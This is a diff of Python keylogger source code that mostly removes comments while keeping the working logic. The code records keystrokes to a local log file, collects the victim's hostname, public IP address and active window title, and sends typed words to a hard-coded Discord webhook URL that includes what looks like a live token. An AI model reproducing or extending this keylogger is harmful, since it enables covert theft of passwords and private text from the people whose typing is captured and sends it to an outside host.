@@ -13,22 +13,20 @@ def get_public_ip():
         return None
 
 
-# Get the hostname and IP address
+
 hostname = socket.gethostname()
 ip_address = get_public_ip()
 active_window = pywinctl.getActiveWindowTitle()
 
 username = f"[{hostname}]({ip_address})"
 
-# This tells the keylogger where the log file will go.
-# You can set the file path as an environment variable ('pylogger_file'),
-# or use the default ~/Desktop/file.log
+
 log_file = os.environ.get(
     'pylogger_file',
     os.path.expanduser('~/Desktop/file.log')
 )
 
-# Allow setting the cancel key from environment args, Default: `
+
 cancel_key = ord(
     os.environ.get(
         'pylogger_cancel',
@@ -36,29 +34,23 @@ cancel_key = ord(
     )[0]
 )
 
-# Allow clearing the log file on start, if pylogger_clean is defined.
 if os.environ.get('pylogger_clean', None) is not None:
     try:
         os.remove(log_file)
     except EnvironmentError:
-        # File does not exist, or no permissions.
         pass
 
-# Global variables to keep track of the current word and last key press time
 current_word = ""
 last_key_press_time = time.time()
 
-# Function to send a message to Discord
 def send_to_discord(message):
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/985547048503885904/Y86E1VAhyrX6BNmLcsExUNuvobrgjz3JebUbZdg8t2euE0OQHW8k-IEumDRGRvYe1atv', content=message, username=username + "==>" +  active_window)
     response = webhook.execute()
 
-# Function to handle key press events
 def OnKeyPress(event):
     global current_word, last_key_press_time
     with open(log_file, 'a') as f:
         if event.Ascii == 13:  # Enter
-            # Send the current word to Discord and reset it
             if current_word:
                 send_to_discord(current_word)
                 current_word = ""
